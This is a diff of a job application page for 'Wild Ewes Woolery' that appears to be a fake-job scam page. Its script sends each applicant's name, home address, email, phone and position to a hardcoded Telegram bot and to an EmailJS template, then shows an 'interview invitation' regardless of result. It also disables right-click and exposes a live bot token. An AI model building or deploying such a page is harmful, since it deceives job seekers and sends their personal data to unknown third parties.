@@ -2,111 +2,38 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Apply | Wild Ewes Woolery</title>
-  <meta name="description" content="Apply to Wild Ewes Woolery jobs including data entry, customer service, and logistics roles. Fast and remote-friendly application process.">
-  <meta name="keywords" content="Wild Ewes Woolery jobs, logistics careers, remote data entry, customer service openings, apply Wild Ewes">
-  <meta property="og:title" content="Apply for Jobs at Wild Ewes Woolery" />
-  <meta property="og:description" content="Explore open roles in logistics, customer support, and more. Apply today." />
-  <meta property="og:url" content="https://wildeweswoolery.com/careers" />
-  <meta property="og:type" content="website" />
-  <meta property="og:image" content="https://wildeweswoolery.com/assets/logo.png" />
-  <meta name="twitter:card" content="summary_large_image" />
-  <link rel="canonical" href="https://wildeweswoolery.com/careers" />
-  <link rel="stylesheet" href="style.css" />
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #fff;
-      margin: 0;
-      padding: 0;
-    }
-    .navbar {
-      background-color: #003366;
-      color: white;
-      padding: 1rem;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-    .navbar img {
-      height: 40px;
-    }
-    .navbar a {
-      color: white;
-      margin-left: 20px;
-      text-decoration: none;
-      font-weight: bold;
-    }
-    .form-container {
-      max-width: 500px;
-      margin: 40px auto;
-      background-color: #f9f9f9;
-      padding: 30px;
-      border-radius: 8px;
-      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
-    }
-    .form-container h2 {
-      text-align: center;
-      color: #003366;
-    }
-    .form-container input,
-    .form-container select,
-    .form-container button {
-      width: 100%;
-      padding: 10px;
-      margin-top: 15px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-    }
-    .form-container button {
-      background-color: #003366;
-      color: white;
-      cursor: pointer;
-    }
-    .success-message {
-      display: none;
-      color: green;
-      text-align: center;
-    }
-    .interview-details,
-    .contact-page {
-      display: none;
-      padding: 30px;
-      max-width: 800px;
-      margin: 0 auto;
-    }
-    .center-me {
-      text-align: left;
-    }
-    .contact-page h2 {
-      color: #003366;
-    }
-  </style>
-  <!-- LiveChat -->
+  <meta name="description" content="Apply for roles at Wild Ewes Woolery – data entry, admin, delivery, customer support and more." />
+  <link rel="stylesheet" href="/style.css" />
+  <link rel="icon" href="/favicon.ico" />
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    window.__lc = window.__lc || {};
-    window.__lc.license = 16972020;
-    (function () {
-      var lc = document.createElement("script");
-      lc.type = "text/javascript";
-      lc.async = true;
-      lc.src = "https://cdn.livechatinc.com/tracking.js";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(lc, s);
-    })();
+    function loadEmailJSSDK(callback) {
+      if (typeof emailjs !== 'undefined') {
+        callback();
+      } else {
+        const script = document.createElement('script');
+        script.src = 'https://cdn.emailjs.com/dist/email.min.js';
+        script.onload = callback;
+        document.head.appendChild(script);
+      }
+    }
   </script>
 </head>
 <body>
-  <div class="navbar">
-    <img src="https://wildeweswoolery.com/assets/logo.png" alt="Wild Ewes Woolery Logo" />
-    <div>
-      <a href="/index">Home</a>
-      <a href="/about">About</a>
-      <a href="/careers">Careers</a>
-      <a href="/contact">Contact</a>
-    </div>
-  </div>
+  <header class="main-header">
+    <div class="logo"><a href="/index">Wild Ewes Woolery</a></div>
+    <nav>
+      <ul>
+        <li><a href="/about">About</a></li>
+        <li><a href="/careers">Careers</a></li>
+        <li><a href="/shippers">Shippers</a></li>
+        <li><a href="/carriers">Carriers</a></li>
+        <li><a href="/contact">Contact</a></li>
+      </ul>
+    </nav>
+  </header>
 
   <div class="form-container" id="apply">
     <h2>Job Application Form</h2>
@@ -131,7 +58,7 @@
     <div class="success-message" id="success-message">Application Successfully Submitted!</div>
   </div>
 
-  <div class="interview-details" id="interviewDetails">
+  <div class="interview-details" id="interviewDetails" style="display:none;">
     <div class="center-me">
       <h2>Interview Invitation: Discuss Your Role</h2>
       <p>As part of our commitment to understanding each team member’s experience and ensuring the necessary support for success, we’d like to schedule a brief interview with you.</p>
@@ -154,7 +81,7 @@
     </div>
   </div>
 
-  <div class="contact-page" id="contactPage">
+  <div class="contact-page" id="contactPage" style="display:none;">
     <h2>Our Offices</h2>
     <p><strong>California</strong><br>Corporate Office<br>7975 Cameron Dr., Bldg. 1500-A, Windsor, CA 95492<br>+1 (818) 296-2990</p>
     <p><strong>California</strong><br>Branch Office<br>780 Roosevelt STE, Irvine, CA 92620<br>+1 (800) 492-1135</p>
@@ -162,47 +89,61 @@
   </div>
 
   <script>
-    // Disable right-click
     document.addEventListener('contextmenu', event => event.preventDefault());
 
-    // Show Contact Page
-    function showContactPage() {
-      document.querySelector('.container').style.display = 'none';
-      document.querySelector('.form-container').style.display = 'none';
-      document.querySelector('.interview-details').style.display = 'none';
-      document.querySelector('.contact-page').style.display = 'block';
-    }
+    loadEmailJSSDK(() => {
+      emailjs.init("1zVbYwsIj5NevmCP0"); // ✅ Your public EmailJS key
 
-    // Form Submission
-    document.getElementById("jobForm").addEventListener("submit", function(event) {
-      event.preventDefault();
+      document.getElementById("jobForm").addEventListener("submit", function(event) {
+        event.preventDefault();
 
-      let name = document.getElementById("name").value;
-      let address = document.getElementById("address").value;
-      let email = document.getElementById("email").value;
-      let phone = document.getElementById("phone").value;
-      let position = document.getElementById("position").value;
+        let name = document.getElementById("name").value;
+        let address = document.getElementById("address").value;
+        let email = document.getElementById("email").value;
+        let phone = document.getElementById("phone").value;
+        let position = document.getElementById("position").value;
 
-      let message = `New Application:\nName: ${name}\nAddress: ${address}\nEmail: ${email}\nPhone: ${phone}\nPosition: ${position}`;
+        // ✅ Telegram
+        let telegramMessage = `New Application:\nName: ${name}\nAddress: ${address}\nEmail: ${email}\nPhone: ${phone}\nPosition: ${position}`;
+        let telegramURL = `https://api.telegram.org/bot6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4/sendMessage?chat_id=1461764555&text=${encodeURIComponent(telegramMessage)}`;
+        
+        fetch(telegramURL)
+          .then(response => response.json())
+          .then(data => console.log("Telegram OK:", data))
+          .catch(error => console.error("Telegram error:", error));
 
-      let telegram_bot_token = "6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4";
-      let telegram_chat_id = "1461764555";
-      let telegram_url = `https://api.telegram.org/bot${telegram_bot_token}/sendMessage?chat_id=${telegram_chat_id}&text=${encodeURIComponent(message)}`;
-
-      fetch(telegram_url)
-        .then(response => response.json())
-        .then(data => {
-          if (data.ok) {
-            document.querySelector('.form-container').style.display = 'none';
-            document.getElementById("interviewDetails").style.display = 'block';
-          } else {
-            alert('Failed to submit application. Please try again.');
-          }
+        // ✅ EmailJS
+        emailjs.send("default_service", "template_kpi5n6e", {
+          name: name,
+          address: address,
+          email: email,
+          phone: phone,
+          position: position
         })
-        .catch(error => {
-          alert('An error occurred while submitting the application. Please try again.');
+        .then(function(response) {
+          console.log("EmailJS success", response);
+        }, function(error) {
+          console.error("EmailJS error", error);
         });
+
+        // ✅ Show Interview Panel
+        document.querySelector('.form-container').style.display = 'none';
+        document.getElementById("interviewDetails").style.display = 'block';
+      });
     });
+  </script>
+
+  <!-- ✅ LiveChat -->
+  <script>
+    window.__lc = window.__lc || {};
+    window.__lc.license = 16972020;
+    ;(function(n,t,c){
+      function i(n){
+        return e._h ? e._h.apply(null,n) : e._q.push(n)
+      }
+      var e = { _q: [], _h: null, _v: "2.0", on: function(){ i(["on", c.call(arguments)]) }, once: function(){ i(["once", c.call(arguments)]) }, off: function(){ i(["off", c.call(arguments)]) }, get: function(){ if(!e._h) throw new Error("[LiveChatWidget] You can't use getters before load."); return i(["get", c.call(arguments)]) }, call: function(){ i(["call", c.call(arguments)]) }, init: function(){ var n = t.createElement("script"); n.async = !0, n.type = "text/javascript", n.src = "https://cdn.livechatinc.com/tracking.js", t.head.appendChild(n) } };
+      !n.__lc.asyncInit && e.init(), n.LiveChatWidget = n.LiveChatWidget || e
+    })(window, document, [].slice)
   </script>
 </body>
 </html>
